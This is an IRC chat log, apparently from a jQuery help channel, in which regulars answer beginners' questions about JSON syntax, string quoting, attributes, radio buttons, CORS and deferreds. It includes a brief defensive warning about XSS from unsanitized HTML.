[08:43:27] <PhilFromHeck> it appears to be on the literal 'n' of the first property of the JSON, but if I throw it in quotes it says that the " is unexpected; thoughts?
[08:44:07] <duch_kazatel> JSON needs doublequotes around all property names.
[08:44:47] <PhilFromHeck> Will give it a go, thanks duch!
[08:44:56] <duch_kazatel> http://jsfiddle.net/robertmaxrees/ww7m4afu/1/
[08:45:08] <duch_kazatel> all strings and property names need doubles. not singles.
[08:48:24] <PhilFromHeck> Ah okay, just confirmed it myself- thanks for the fiddle!
[08:49:17] <duch_kazatel> yep.
[08:51:46] <PhilFromHeck> Muahahaha, got the live instance working in my app now ;]

[08:56:21] <lalalaaa> Hi! How do I replace the image in .new with the image in .old? http://jsfiddle.net/z2my2h4y/
[08:56:53] <lalalaaa> Ooops sorry -- http://jsfiddle.net/amqkt434/
[09:03:43] <Es0teric> motaka2 because it has a rest api
[09:06:24] <duch_kazatel> lalalaaa 'new' is not a valid variable name
[09:07:06] <Lindrian> I want to execute a function that returns a deferred, when that has succeeded, execute a bunch of other deferreds and when those are done, return. So something like deferred.done($.when(....).done(...)); but I'm a bit unsure of the syntax here
[09:07:28] <duch_kazatel> lalalaaa also, http://jsfiddle.net/robertmaxrees/amqkt434/1/
[09:07:35] <Lindrian> I assume it would end up being something like deferred.done(function() { $.when(...).done(...); }); right?
[09:09:47] <lalalaaa> greetings duch_kazatel !
[09:09:55] <lalalaaa> thank you for that lovely solution :)
[09:29:26] <printForever> I got a problem with a string http://pastebin.com/ZS6LP5dW
[09:29:36] <printForever> I cant add a variable inside .replaceWith()
[09:29:43] <duch_kazatel> sure you can.
[09:30:00] <duch_kazatel> you don't need to escape the double quotes btw.
[09:30:02] <printForever> its returning variable name, as if the variable is not working
[09:30:12] <printForever> huh?
[09:30:21] <duch_kazatel> \"
[09:30:24] <duch_kazatel> don't need that here.
[09:30:34] <duch_kazatel> you's surrounded the string with single quotes.
[09:30:49] <duch_kazatel> $('.header div.title-box > a').replaceWith('<a href=y"/editors/apply_form/' + iamhere + '" title="Try it out and test it" id="testitbtn">Test it</a>');
[09:31:09] <duch_kazatel> err, ditch the y at the beginning, but you get the idea.
[09:31:10] <printForever> ok
[09:31:24] <Cork> also note you prob want to avoid adding html that way
[09:31:25] <printForever> I tried that, didn't work
[09:31:27] <printForever> I will try again
[09:31:48] <Cork> as if iamhere contains unsanitized content you can have xss
[09:31:54] <duch_kazatel> ^
[09:32:02] <printForever> what do you suggest Cork?
[09:32:06] <duch_kazatel> what's the goal here?
[09:32:10] <motaka2> duch_kazatel:  hello is there a better way to do things like this?
[09:32:10] <motaka2> https://gist.github.com/anonymous/aed4bf3ff1e212637b49
[09:32:14] <printForever> just add text to url
[09:32:18] <Cork> a better option is most likely to just set the href and text of the old a tag instead
[09:32:31] <duch_kazatel> t
[09:32:50] <duch_kazatel> err, motaka2 no idea what problem you're solving.
[09:32:50] <Cork> printForever: $('.header div.title-box > a').attr('href', newUrl).text('Text it')
[09:33:08] <Cork> or just href if you don't want to change the text
[09:33:09] <printForever> and I need and just add ID
[09:33:16] <printForever> right
[09:33:45] <duch_kazatel> motaka2 also, barking orders at me isn't going to help you much ;)
[09:34:40] <printForever> Cork, can I chain several attr?
[09:35:13] <Cork> yes
[09:35:15] <duch_kazatel> printForever http://api.jquery.com/attr/
[09:35:19] <printForever> thanks
[09:35:19] <duch_kazatel> the docs tell you as much.
[09:35:22] <printForever> found it
[09:36:47] <printForever> thank you guys! duch_kazatel, Cork
[09:36:58] <RattyWork_> Hey, is there a reason focus doesn’t work in Firefox v41(latest stable) - http://jsfiddle.net/p3vh1x7w/
[09:37:22] <RattyWork_> or maybe it is a problem with FF
[09:37:24] <duch_kazatel> RattyWork_ 'this' likely isn't what you think it is there ;)
[09:37:34] <RattyWork_> Well even at that
[09:37:35] <hapi> +1
[09:37:46] <Cork> RattyWork_: this inside the timer is window
[09:38:00] <RattyWork_> If oyu put $(“.name-row”).focus()
[09:38:03] <RattyWork_> it still doesn’t work
[09:38:05] <Cork> so you are effectively focusing window on a timeout
[09:38:12] <duch_kazatel> RattyWork_ also, jsfiddle isn't a very good way to test things like this.
[09:38:32] <Cork> RattyWork_: that sounds kinda abusive
[09:38:36] <hapi> RattyWork_: http://jsfiddle.net/p3vh1x7w/2/
[09:38:36] <duch_kazatel> ^
[09:38:42] <RattyWork_> Even doing this doesnt work - http://jsfiddle.net/evLjLqhm/
[09:38:50] <Cork> and i wouldn't be surprised if they actively block that
[09:38:54] <duch_kazatel> why are you forcing focus when the user has left focus?
[09:39:02] <duch_kazatel> you're basically stopping them from doing anything on their own.
[09:39:03] <RattyWork_> hapi: It doesn’t focus :(
[09:39:14] <hapi> bexause that good-ux duch_kazatel :D
[09:39:21] <duch_kazatel> hurr hurr
[09:39:41] <RattyWork_> I am focusing, because I want to focus on the first input in the newly added row
[09:39:54] <duch_kazatel> that's not what this code does.
[09:40:03] <hapi> use attribute then RattyWork_
[09:40:07] <RattyWork_> Well yeah, but even a bsic focus isn’t working
[09:40:16] <RattyWork_> That is why I was curious.
[09:41:02] <duch_kazatel> eh, your "basic focus" was a case that ff probably actively blocks.
[09:41:27] <RattyWork_> Well this should work right? http://jsfiddle.net/evLjLqhm/
[09:41:36] <RattyWork_> Basic focus()
[09:41:47] <RattyWork_> It isn’t working for me in FF
[09:41:49] <Cork> RattyWork_: http://fiddle.jshell.net/evLjLqhm/2/show/light/
[09:42:08] <duch_kazatel> jsfiddle is not a good thing to test autofocus.
[09:42:18] <Qiller> hi friends, can i store multiple values on variable like php .= ? var test .= "value"; var test .= "value2";
[09:42:29] <duch_kazatel> Qiller you mean append stings?
[09:42:47] <Qiller> nice idea
[09:42:47] <duch_kazatel> Qiller var test = 'value';  test += 'value2';
[09:42:50] <RattyWork_> Cork and duch_kazatel Well I mean in general it isn’t working.
[09:42:57] <duch_kazatel> Qiller use an array instead.
[09:43:04] <duch_kazatel> RattyWork_ uh, i've seen this work plenty of times,.
[09:43:05] <duch_kazatel> but oaky.
[09:43:06] <duch_kazatel> *okay
[09:43:10] <Qiller> hmm += work fine with strings? thank
[09:43:22] <Cork> RattyWork_: the link i gave you works fine here
[09:43:24] <duch_kazatel> string concatenation or adding numbers.
[09:43:25] <printForever> duch_kazatel:
[09:43:28] <printForever> its not working :(
[09:43:34] <duch_kazatel> printForever make a fiddle thing.
[09:43:36] <duch_kazatel> *then
[09:45:04] <RattyWork_> Cork: That works?
[09:45:25] <Cork> autofocus works ya
[09:45:28] <Qiller> its dont work, return error here: var test += '<div>bla bla</div><div>bla bla</div><div>bla bla</div><div>bla bla</div><div>bla bla</div>;
[09:45:28] <duch_kazatel> RattyWork_ test outside of jsfiddle.  the iframes can cause headaches sometimes for things like this.
[09:45:35] <Cork> RattyWork_: note the js has no effect
[09:45:41] <duch_kazatel> Qiller missing a closing '
[09:45:52] <duch_kazatel> Qiller also, need to drop the var keyword.
[09:46:00] <duch_kazatel> declare var once, then you can append.
[09:46:19] <Qiller> ok
[09:46:30] <duch_kazatel> Qiller http://jsfiddle.net/robertmaxrees/9nov673x/
[09:46:31] <Cork> O_o
[09:46:44] <Cork> jsfiddle has started including ads now??
[09:46:54] <duch_kazatel> what where?
[09:46:58] <printForever> duch_kazatel: http://jsfiddle.net/x6uoLm9m/1/
[09:47:04] <Cork> http://cdn.carbonads.com <--
[09:47:05] <Qiller> wow, nice duch_kazatel you are the best
[09:47:15] <duch_kazatel> printForever you're missing jquery in there.
[09:47:26] <printForever> sorry, duch_kazatel
[09:47:29] <duch_kazatel> printForever and href: "/odlurl/2ndlevel/' + iamhere + '" again - you're mixing doubles and singles
[09:47:49] <printForever> duch_kazatel: http://jsfiddle.net/x6uoLm9m/2/
[09:48:03] <Cork> yup definitely has ads now
[09:48:13] <duch_kazatel> right, fix your string printForever
[09:48:17] <printForever> you told me to mix them?!
[09:48:17] <duch_kazatel> your outer quotes need to match.
[09:48:23] <duch_kazatel> not like this.
[09:48:25] <printForever> they do
[09:48:28] <duch_kazatel> no, they don't.
[09:48:31] <printForever> o.0
[09:48:34] <duch_kazatel> href: "/odlurl/2ndlevel/" + iamhere
[09:48:50] <duch_kazatel> you want to take a string - "/odlurl/2ndlevel/" - and concat another string - iamhere
[09:48:57] <Cork> printForever: "/odlurl/2ndlevel/' <-- that isn't a string
[09:49:05] <duch_kazatel> the string literal needs to be "self-contained", so it needs doubles around just it.
[09:49:10] <Cork> start and end quote needs to be the same
[09:49:13] <duch_kazatel> also - + '" isn't a thing.
[09:49:18] <printForever> :/
[09:49:20] <duch_kazatel> you just want href: "/odlurl/2ndlevel/" + iamhere
[09:50:18] <printForever> understood
[09:50:28] <printForever> I get , instead of /
[09:50:32] <printForever> from the original url
[09:50:56] <duch_kazatel> why do you have the .split()?
[09:50:59] <duch_kazatel> that's getting you an array.
[09:51:02] <printForever> http://jsfiddle.net/x6uoLm9m/3/
[09:51:06] <printForever> ah
[09:51:12] <printForever> because I wanted to remove / slash
[09:51:21] <duch_kazatel> then use a .replace()
[09:51:42] <duch_kazatel> need a global replace.
[09:52:16] <printForever> so if I use + iamhere[1]
[09:52:24] <printForever> then I would just grab text?
[09:52:27] <duch_kazatel> you're making a big assumption.
[09:52:43] <duch_kazatel> just use .replace()
[09:52:44] <Cork> printForever: are you sure you want to modify "new option" and not the original link?
[09:52:51] <printForever> Cork, yes
[09:53:57] <printForever> duch_kazatel: I'm sorry I dont understand how to use .replace
[09:54:11] <duch_kazatel> so then find the docs for it.
[09:54:20] <duch_kazatel> https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace
[09:54:29] <duch_kazatel> protip: you'll need to use a global replace.
[09:54:31] <printForever> duch_kazatel: thanks
[09:54:40] <duch_kazatel> google is your friend.
[09:55:21] <printForever> duch_kazatel: , why should I avoid array id?
[09:55:21] <Cork> printForever: http://jsfiddle.net/x6uoLm9m/4/
[09:55:58] <printForever> OMG Cork!
[09:55:59] <printForever> .filter(Boolean).join('/')
[09:56:03] <duch_kazatel> ew
[09:56:06] <duch_kazatel> eeeeew
[09:56:09] <printForever> ???
[09:56:10] <Cork> alternatively you can use .replace(/\/$/, '')
[09:56:21] <duch_kazatel> ^
[09:56:22] <duch_kazatel> use that
[09:56:31] <Cork> ya, filter is just a bit fun :)
[09:56:38] <duch_kazatel> that filter(Boolean) trick is... interesting.
[09:57:00] <Cork> it has the advantage or removing extra slash inside the url
[09:57:13] <duch_kazatel> and is a roundabout way to do what you want ;)
[09:57:20] <Cork> /test//something/do/ => test/something/do
[09:57:58] <Cork> duch_kazatel: well it removes falsy members from the array :)
[09:58:20] <Cork> though ya i suspect it removes '0' too :x
[09:58:21] <duch_kazatel> i know exactly what it does, but i always reject code like that.
[09:58:28] <duch_kazatel> actually, string 0 would be safe.
[09:58:30] <Cork> ya, same here
[09:58:51] <printForever> Cork's idea was great
[09:58:56] <Cork> i like playing with code ppl wouldn't expect though :D
[09:59:06] <duch_kazatel> don't use .filter(Boolean) printForever
[09:59:06] <Cork> printForever: not really, it wasn't meant to be used
[09:59:22] <Cork> the replace was meant to be the real answer
[09:59:36] <printForever> replace isn't working
[09:59:41] <printForever> for some reason... :/
[09:59:45] <Cork> ...
[09:59:58] <printForever> should I add .replace("/\/$/", '')
[10:00:00] <Cork> that's what i get for joking...
[10:00:09] <Cork> printForever: that isn't what i wrote
[10:00:36] <printForever> Cork: true, but my editor is telling me that the code is escaped
[10:00:41] <printForever> instead of it being regexp
[10:01:08] <Cork> printForever: then use a better editor
[10:01:10] <Cork> http://jsfiddle.net/x6uoLm9m/5/
[10:01:19] <duch_kazatel> .replace(/\/$/, '') is what you want here
[10:01:36] <Cork> duch_kazatel: that is what i gave him before
[10:01:38] <printForever> I know its working in the fiddle, but...
[10:01:49] <duch_kazatel> Cork yeah i know.
[10:01:53] <duch_kazatel> i'm reiterating it's what they want.
[10:02:01] <duch_kazatel> printForever if your editor is choking on that, you need a new editor.
[10:02:07] <duch_kazatel> because that's a valid line of JS.
[10:02:19] <Cork> and a quite common one
[10:02:42] <printForever> right... :/
[10:02:50] <duch_kazatel> what editor are you using?
[10:03:04] <Cork> i guess you could go the round about way with .replace(new RegExp('\\/$'), '')
[10:03:15] <Cork> but i wouldn't like seeing that >_<
[10:04:30] <duch_kazatel> printForever yeah, what editor are you using?  and are you sure it's in the right "mode"?
[10:04:42] <printForever> phpStorm
[10:05:12] <duch_kazatel> make triple sure that you're in javascript mode, since jetbrains know what they're doing.
[10:05:42] <printForever> ...
[10:05:57] <printForever> I tried .replace(new RegExp('\\/$'), '') it breaks jQUery
[10:06:09] <duch_kazatel> huh?
[10:06:18] <printForever> yeah... the script doesn't work
[10:06:28] <duch_kazatel> it's unemployed?
[10:06:33] <duch_kazatel> how do you "break jquery"?
[10:06:36] <printForever> .filter(Boolean).join('/') <- this works great
[10:06:46] <duch_kazatel> i really wouldn't use that.
[10:06:51] <duch_kazatel> you're doing something really strange.
[10:06:55] <printForever> its the same script as on fiddle
[10:07:00] <printForever> I know it works in the fiddle
[10:07:05] <printForever> but in phpStorm its not
[10:07:19] <Cork> uh, that makes no sense...
[10:07:27] <Cork> printForever: works fine... http://jsfiddle.net/x6uoLm9m/6/
[10:07:30] <duch_kazatel> yeah, you're doing something wrong.
[10:07:45] <Cork> printForever: are you generating your js in php or something horrible like that?
[10:07:54] <printForever> no, its an exteranl file
[10:08:14] <duch_kazatel> and phpstorm is recognizing it as a js file and not a php file?
[10:08:21] <printForever> I was still using SPLIT!!!
[10:08:34] <Cork> ...
[10:08:45] <duch_kazatel> so we literally gave you the code you needed to use and you kept not using it?
[10:08:54] <zzaichik> haha
[10:09:05] <printForever> :(
[10:09:11] <printForever> I haz the dumbz todayz
[10:09:25] <printForever> sorry duch_kazatel
[10:09:38] <printForever> thank you for patience Cork
[10:16:59] <rindolf> Hi all. Sup?
[10:17:17] <duch_kazatel> not much, rindolf!
[10:17:18] <duch_kazatel> how're you?
[10:17:37] <rindolf> duch_kazatel: I'm fine - started sorting my bookmarks.
[10:17:47] <duch_kazatel> fun(?)
[10:17:51] <rindolf> duch_kazatel: had this there - http://zsync.moria.org.uk/
[10:18:14] <rindolf> duch_kazatel: it's a little vexing , but it's necessary.
[10:29:20] <Kamuela> how do you use jquery on an svgdoc?
[10:29:29] <duch_kazatel> on svg?
[10:29:33] <duch_kazatel> you... don't.
[10:29:42] <duch_kazatel> jquery is a DOM abstraction library.
[10:29:46] <duch_kazatel> svg !== DOM
[10:30:12] <Kamuela> too bad... jquery so kewl otherwise
[10:30:20] <duch_kazatel> uh.
[10:30:22] <duch_kazatel> not too bad?
[10:30:28] <duch_kazatel> allows the library to focus on one thing.
[10:30:39] <duch_kazatel> it can't be everything to all people ;)
[10:30:46] <duch_kazatel> there are plugins out there that add support though.,
[10:32:34] <guideX> what is the proper way to uncheck a radiobutton, I tried .attr("checked", false) .prop("checked", false) but not working
[10:32:45] <duch_kazatel> 'selected' iirc.
[10:33:04] <guideX> hrm ok let me try thanks
[10:33:29] <guideX> hrm, selected doesn't seem to do anything...
[10:33:33] <duch_kazatel> fiddle pls
[10:33:38] <guideX> like this right? <option ... selected />
[10:33:45] <guideX> hrm ok
[10:33:53] <guideX> but, jsfiddle is blocked for me
[10:34:02] <duch_kazatel> huh?
[10:34:25] <guideX> I am unable to provide a jsfiddle, network blocks it
[10:34:31] <duch_kazatel> bin?
[10:34:31] <guideX> maybe there's some other similar site..
[10:34:33] <duch_kazatel> anything else?
[10:35:00] <duch_kazatel> wait you mean like a dropdown?
[10:35:08] <guideX> radiobutton
[10:35:17] <duch_kazatel> <option ... selected /> isn't a radio
[10:35:22] <guideX> sorry, meant <input
[10:35:29] <guideX> input type="radio" etc
[10:36:37] <duch_kazatel> $('input').prop('checked', false);
[10:36:42] <duch_kazatel> that'll work for radios.
[10:36:51] <duch_kazatel> if it's not working for you, verify your selector is good.
[10:36:53] <guideX> I also tried.. $("#radProcessing").prop("selected", false);
[10:36:59] <guideX> ah ok
[10:38:42] <guideX> http://pastebin.com/KiKzpC8V
[10:39:07] <duch_kazatel> #radProcessing is for IDs.
[10:39:09] <duch_kazatel> not names.
[10:39:18] <guideX> hrm..
[10:39:20] <duch_kazatel> and you want the change event, not click.
[10:39:36] <duch_kazatel> and this is not how you use radios.
[10:39:46] <duch_kazatel> you give them all the same name and they automatically check/uncheck for you.
[10:39:53] <guideX> oh hrm...
[10:40:10] <guideX> I rarely use radio buttons because they always give me trouble heh,
[10:40:15] <guideX> but ok cool
[10:40:19] <guideX> i'll try that thansk
[10:40:25] <duch_kazatel> they use the same name but different values.
[10:41:24] <guideX> oh look at that cool
[10:41:25] <guideX> thanks
[10:43:38] <lalalaaa> so whats up with you guys
[10:43:41] <lalalaaa> long time since i been here
[10:43:45] <lalalaaa> anybody built anything cool lately?
[10:43:58] <duch_kazatel> lots of stuff i can't talk about yet sadly.
[10:44:37] <lalalaaa> duch_kazatel: not even a hint? :)
[10:44:53] <duch_kazatel> nope/.
[10:45:16] <lalalaaa> lol
[10:49:49] <lalalaaa> anyway im out
[10:49:55] <lalalaaa> thanks again duch_kazatel and good luck!
[10:50:02] <lalalaaa> props to shoky_, doug and Omar-
[10:50:13] <lalalaaa> bless
[10:56:28] <jak2000> how to check if a control exists? sample: <input type="text" id="xQty" value="5">  and in jQuery: var $Qty = $("#wQty").val();   <--- in this case wQty not exist, how to ask before? thanks
[10:56:37] <duch_kazatel> .length
[10:57:05] <duch_kazatel> var $Qty = $('#wQty');  if ($Qty.length) {}
[10:58:42] <km4> hi, how can i add number on src in img when i hover this image ? example image1.jpg > hover > edit attr image1_1.jpg or image1a.jpg ?
[10:58:58] <duch_kazatel> edit the .attr() of the image.
[10:59:10] <duch_kazatel> and bind on mouseenter
[11:00:04] <km4> yes but how to add automaticly/dynamic _1, _a ?
[11:00:26] <duch_kazatel> by editing the .attr('src')?
[11:00:31] <duch_kazatel> not sure where you're lost.
[11:01:27] <jak2000> duch_kazatel thanks
[11:08:12] <jak2000> how to format, a number ###,##0.00 ?
[11:08:20] <duch_kazatel> what does that mean
[11:08:20] <duch_kazatel> ?
[11:08:25] <KJ3222> Is there a way to add to a dom element like h1 WITHOUT waiting until the page loads?
[11:08:39] <duch_kazatel> KJ3222 sure - don't use a document ready.
[11:09:16] <duch_kazatel> the only requirement is that the relevant node that you're appending to must exist, KJ3222
[11:11:26] <KJ3222> so if i have a h1 with a specific id i HAVE TO use doc ready?? to add text or something
[11:13:21] <duch_kazatel> or put your code right after where you want it to be.
[11:17:37] <jak2000> duch_kazatel any advice?
[11:17:52] <duch_kazatel> i asked you "what does that mean?"
[11:18:10] <duch_kazatel> give me an example number that you're starting with, and what you want it to look like.
[11:19:25] <jak2000> ok escuse me
[11:19:39] <jak2000> i want: 65000.56 convert to: 65,000.56
[11:19:54] <duch_kazatel> so you want to endter a thousands separator?
[11:20:19] <jak2000> yes
[11:20:57] <duch_kazatel> !g javascript add thousands comma
[11:21:09] <duch_kazatel> bad b-ot - http://stackoverflow.com/questions/2901102/how-to-print-a-number-with-commas-as-thousands-separators-in-javascript
[11:21:13] <duch_kazatel> lots of results out there.
[11:21:57] <jak2000> thanks
[11:35:55] <seemikehack> Hey all, running up against a CORS issue that doesn't seem like it should be happening. I can hit an endpoint with curl and Postman just fine, but when I do a $.get from a locally running app, I get an Access-Control-Allow-Origin error. The domain the request is coming from is something like siteID.local.company.com:8080/servlet/endpoint; it's not actually coming from a company server, I've just doctored my hosts file. Thoughts?
[11:37:02] <duch_kazatel> that's CORS
[11:37:15] <duch_kazatel> seemikehack the port, protocol, and domain must math
[11:37:17] <duch_kazatel> *match
[11:37:42] <seemikehack> duch_kazatel, I think it's the port, then, my hosts file doesn't specify that.
[11:37:46] <duch_kazatel> curl and postman are different - CORS only impacts ajax within browsers.
[11:39:08] <seemikehack> Maybe I need to set up a web server to proxy requests without the port number?
[11:39:22] <duch_kazatel> then you can bypass literally everything else.
[11:39:28] <duch_kazatel> if the server makes the request, different story.
[11:39:57] <duch_kazatel> CORS protects you from visiting my page and it maliciously using ajax to your email inbox since it would authenticate as you.
[11:40:51] <seemikehack> duch_kazatel, I don't run the endpoint that I'm trying to hit, I just need it to think the requests are coming and going from the same place.
[11:41:22] <duch_kazatel> no, you need your browser to be okay with it.
[11:41:26] <seemikehack> duch_kazatel, when it's deployed, I'm sure it will be no issue.
[11:41:31] <duch_kazatel> setup a box that proxies the requests and you'll be fine.
[11:41:32] <seemikehack> duch_kazatel, ah, yes, right.
[11:41:41] <duch_kazatel> and when it's deployed, you'll still need to be on the same port, prototcol, and domain.
[11:43:13] <jak2000> duch_kazatel: Uncaught TypeError: Cannot read property 'length' of undefined
[11:43:20] <duch_kazatel> jak2000 make a fiddle.
[11:45:02] <seemikehack> duch_kazatel, maybe I'm not explaining the setup very well, but I have some more investigating to do, and I think the proxy will work for development.
[11:49:45] <seemikehack> duch_kazatel, well, now looking at the network traffic, the origin in the header of the request and the address bar are the same. This seems like it should be working.
[11:49:53] <jorvis> Does anyone use the blueimp file uploading widget?  I can't get even the basic example to work locally, but there are no errors written to my apache log
[11:51:42] <Vetaxili> Hi all, I wondered if someone could tell me why this jquery code works "var $colListPrice  = $($row).find("td.colListPrice"); var grossListPrice = parseFloat($('span.rwListPriceDisplayGross', $colListPrice).val());" but this doesn't "var grossListPrice = parseFloat($($row).find("td.colListPrice").children('span.rwListPriceDisplayGross').val());"
[11:52:43] <seemikehack> Vetaxili, put it in a fiddle so we can run it and don't have to try to read your code inline.
[11:53:13] <duch_kazatel> seemikehack the url of the page you're making the request from must be the same port, protocol, and domain/subdomain as the endpoint you're hitting.
[11:53:36] <duch_kazatel> and yeah, Vetaxili, make a fiddle or something.  format your code.
[11:54:30] <seemikehack> duch_kazatel, wait, I think I just understood the implications of this. I *can't* hit a third-party endpoint over AJAX *without* them sending that header, or being on the same domain?
[11:54:41] <duch_kazatel> seemikehack correct.
[11:54:57] <Vetaxili> Sorry :-P Here is jsfiddle https://jsfiddle.net/fx11h46d/
[11:55:24] <duch_kazatel> what do you mean by "doesn't work"?
[11:55:26] <seemikehack> duch_kazatel, how do anyone do AJAX these days?! Ugh. OK, thanks.
[11:55:44] <duch_kazatel> seemikehack JSONP or by the third party accepting cross-origin requests.
[11:56:19] <KJ3222> whats wrong with this...no blinking just once:   setInterval(function() { xds.hide(); }, 750 );
[11:56:28] <KJ3222> xds is a simple jquery selector
[11:56:49] <seemikehack> duch_kazatel, yeah. OK, thanks again, this was eye-opening. Don't know why it took me this long to get it :)
[11:57:03] <duch_kazatel> KJ3222 you never show it again.
[11:57:12] <Vetaxili> duch_kazatel: I use this style of expression for my getters and setters. Using the second style fails to get or set variables.
[11:57:14] <KJ3222> what am i suppose to do
[11:57:40] <duch_kazatel> KJ3222 show it?
[11:57:49] <duch_kazatel> have two setTimeouts that call one another.
[11:58:38] <duch_kazatel> Vetaxili $('span.rwListPriceDisplayGross', $colListPrice). and $($row).find("td.colListPrice").children('span.rwListPriceDisplayGross') are different.
[11:59:31] <duch_kazatel> the former is a shorcut for .find(), not .children()
[12:00:27] <Vetaxili> duch_kazatel, aaaah, that would explain it. I'm a jQuery noob. Thank you so much :-)
[12:00:40] <duch_kazatel> Vetaxili fwiw you should also pass a radis to parseInt()
[12:00:52] <duch_kazatel> and is $row a jquery object?
[12:01:02] <duch_kazatel> because $($row) seems redundant.
[12:02:22] <seemikehack> duch_kazatel, OK, don't laugh: is there a non-AJAX-y way to programmatically make an asynchronous request that isn't bound by the same-origin policy?
[12:02:40] <KJ3222> if i have 3 <a> with class "pddd" how do i ONLY grab the 2nd one? What would that look like
[12:02:50] <duch_kazatel> KJ3222 what do you think?
[12:02:52] <duch_kazatel> did you try google?
[12:03:01] <duch_kazatel> seemikehack JSONP, but the remote host has to allow it.  otherwise, you need to proxy through your own box.
[12:03:48] <seemikehack> duch_kazatel, JSONP isn't supported. So I'll have to make any requests look like they're coming from the endpoint they're trying to hit.
[12:04:04] <duch_kazatel> seemikehack your BROWSER needs to see them that way.
[12:04:06] <Vetaxili> duch_kazatel; yes $row is jquery object. For some reason when I don't put it as $($row) debugger complaints that .find() is not a function
[12:04:27] <duch_kazatel> Vetaxili because $row isn't a jquery object then.
[12:04:32] <seemikehack> duch_kazatel, sorry, I keep forgetting that point, the browser, yes.
[12:04:35] <duch_kazatel> seemikehack otherwise, you need to proxy through your own box and hit allow CORS.
[12:04:37] <KJ3222> anyone can help me out? : if i have 3 <a> with class "pddd" how do i ONLY grab the 2nd one? What would that look like
[12:05:02] <seemikehack> duch_kazatel, or, I could just chat with the guy on the other end and get him to add the header for our domains :)
[12:05:14] <duch_kazatel> KJ3222 i just asked you what you think.
[12:05:32] <duch_kazatel> seemikehack then he couldn't support any other domain making the same request ;)
[12:05:53] <seemikehack> duch_kazatel, you can only specify one?
[12:06:06] <duch_kazatel> last i checked
[12:06:15] <duch_kazatel> KJ3222 http://google.com/search?q=jquery+get+second+element+by+class
[12:06:21] <seemikehack> duch_kazatel, huh. Good to know. I should check too.
[12:06:33] <seemikehack> duch_kazatel, thanks a million for your help.
[12:06:41] <duch_kazatel> of course!  glad I could be of service!
[12:08:58] <seemikehack> KJ3222, or even taking a step back from the eq and nth-child stuff, just look at what jQuery returns. You get an array of elements.
[12:09:09] <duch_kazatel> seemikehack no you don't :)
[12:09:33] <seemikehack> duch_kazatel, no? Checking...
[12:09:36] <duch_kazatel> you get a jquery object, which is array-like.  using index accessors is generally not what you want because you'll get back a raw dom element.
[12:09:47] <seemikehack> duch_kazatel, oh, well, yes :)
[12:09:48] <Vetaxili> duch_kazatel, I initialise $row(s) in two ways, like this: https://jsfiddle.net/m132gbmv/
[12:10:06] <duch_kazatel> that second one is the issue.
[12:10:16] <duch_kazatel> don't use for loops with jquery objects.
[12:10:23] <duch_kazatel> $rows.each() instead.
[12:10:34] <KJ3222> ok
[12:10:46] <duch_kazatel> also - tr#rowNum is bad.
[12:10:57] <duch_kazatel> ids are unique, prepending them with a tagname makes the selector work much harder.
[12:12:10] <seemikehack> duch_kazatel, right, jQuery provides API to interact with their framework, etc. I was getting ahead of myself.
[12:12:16] <duch_kazatel> *library
[12:13:10] <duch_kazatel> :)
[12:15:35] <Vetaxili> duch_kazatel, unfortunately I can't do anything about tr#rowNum. I'm working on company's code. This change could potentially break a lot of things - the code is a right mess. My poor knowledge of jquery probably doesn't help :P I shall use $rows.each() though. :-) Much appreciated. You were more helpful in the last few minutes than my colleagues in the whole week.
[12:15:43] <seemikehack> duch_kazatel, sorry, now I'm splitting my attention, and not thinking straight :)
[12:16:02] <duch_kazatel> Vetaxili that actually wouldn't break anything unless you have multiple elements with the same ID on the page.
[12:16:08] <duch_kazatel> in which case... good luck.
[12:19:46] <Qiller> duch_kazatel: can i check if class image is loaded using complete? if($('.img:first').complete){ console.log('ok'); }
[12:19:49] <Qiller> in real time
[12:19:53] <duch_kazatel> Qiller no.
[12:20:10] <Qiller> why? any jquery command?
[12:20:13] <duch_kazatel> checking if images are loaded is a big pain in the ass.
[12:20:21] <Qiller> hmm
[12:20:38] <Qiller> i need show a div, but first image loaded
[12:20:48] <duch_kazatel> why?
[12:20:53] <duch_kazatel> why not just show the div?
[12:21:39] <Qiller> using ajax, if i cant load image i reload and not show div
[12:21:55] <duch_kazatel> then use the ajax callback.
[12:22:11] <duch_kazatel> event listeners on images is a big pain and not always guranteed to work.
[12:22:50] <Qiller> hm
[12:22:51] <Qiller> ok
[12:34:01] <Respek> hey if .resize() is to listen for window resizes, what's the method for listening for div resizes?
[12:34:49] <Kamuela> I'm trying to use this to get data-name attributes and set id's from them for an arbitrary amount of nested elements deep in an SVG. What am I doing wrong? https://gist.github.com/KamuelaFranco/cd5349f7ab52794d79ba
[12:46:51] <C0nundrum>  Anyone have experience with d3js ?
[13:02:13] <ceramicskull> What am I doing wrong? I'm trying to remove the li's if there is more than three from each UL: http://jsfiddle.net/5ajwbnd8/
[13:09:39] <Max-P> ceramicskull: There's no element in your page with class="colors" for your ".colors" selector
[13:17:04] <ceramicskull> Max-P: LOL
[13:17:10] <ceramicskull> such a small oversight T_T
[13:19:47] <ceramicskull> Max-P: Thanks for catching that, could of sworn I had put color and didn't even notice
[13:20:57] <Max-P> ceramicskull: You probably should use the same selector in both places, as they can get out of sync. You probably also should go ahead and remove that condition entirely and just slice and remove. If there's less you'll just get an empty set, but won't compute the selector twice
[13:22:11] <ceramicskull> Max-P: http://jsfiddle.net/5ajwbnd8/1/
[13:22:13] <ceramicskull> like that?
[13:24:28] <Max-P> ceramicskull: Yep.
[13:24:33] <duch_kazatel> fwiw ul.color-group is a no-no
[13:24:39] <duch_kazatel> don't prepend with a tag.
[13:26:20] <ceramicskull> duch_kazatel: so I should just use .color-group?
[13:26:23] <duch_kazatel> yep.
[13:26:26] <duch_kazatel> no need for the tag
[13:26:28] <ceramicskull> Kk got it
[13:27:15] <ceramicskull> Thanks all!
[13:34:14] <Pilotbob> Hi all
[13:34:27] <Pilotbob> Anyone good with deffereds?
[13:34:52] <duch_kazatel> just ask your question.
[13:34:55] <duch_kazatel> if we can help, we will :)
[13:35:06] <Pilotbob> Basically, I want to wrap this code in a deferred and once the each is done continue work. https://gist.github.com/PilotBob/0c67571f5bdcd13a9172
[13:35:24] <Pilotbob> the sync returns a promise. But, since it's in the each, I'm not sure how to handle it.
[13:35:28] <duch_kazatel> ah.
[13:35:34] <duch_kazatel> was about to say - each is synchronous.
[13:35:47] <duch_kazatel> you want to .map() that into an array.
[13:35:49] <duch_kazatel> then use .when()
[13:36:20] <Pilotbob> ok, guess I'm not sure how to do that.
[13:36:22] <duch_kazatel> $.when.apply($, arrayOfDeferreds).then(someSuccessFunction);
